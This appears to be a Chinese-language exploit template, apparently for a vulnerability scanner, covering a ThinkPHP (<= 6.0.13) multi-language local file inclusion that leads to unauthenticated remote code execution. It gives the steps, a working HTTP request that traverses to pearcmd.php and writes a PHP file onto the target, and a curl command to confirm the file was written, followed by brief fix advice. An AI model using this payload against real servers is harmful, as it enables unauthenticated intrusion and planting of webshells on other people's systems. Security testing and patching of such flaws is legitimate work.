---
id: THINKPHP-LANG-RCE
title: ThinkPHP 多语言本地文件包含漏洞
product: thinkphp
vendor: ThinkPHP
version_affected: "<= 6.0.13"
severity: CRITICAL
tags: [rce, lfi, 无需认证]
fingerprint: ["ThinkPHP", "ThinkPHP 6.x"]
---

## 漏洞描述

ThinkPHP 在其 6.0.13 版本及以前，存在一处本地文件包含漏洞。当多语言特性被开启时，攻击者可以使用 `lang` 参数来包含任意 PHP 文件。结合 `pearcmd.php` 可以写入任意文件并执行代码。

## 影响版本

- ThinkPHP <= 6.0.13

## 前置条件

- 无需认证
- PHP 环境开启了 `register_argc_argv`
- PHP 环境安装了 pcel/pear

## 利用步骤

1. 使用 lang 参数包含 pearcmd.php
2. 利用 pearcmd 的 config-create 写入 webshell

## Payload

```http
GET /?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=phpinfo()?>+shell.php HTTP/1.1
Host: target:8080
```

## 验证方法

```bash
# 检查 shell.php 是否写入成功
curl -s http://target:8080/shell.php | grep phpinfo
```

## 修复建议

1. 升级 ThinkPHP 至 6.0.14+
2. 禁用多语言功能
3. 升级 PHP 环境
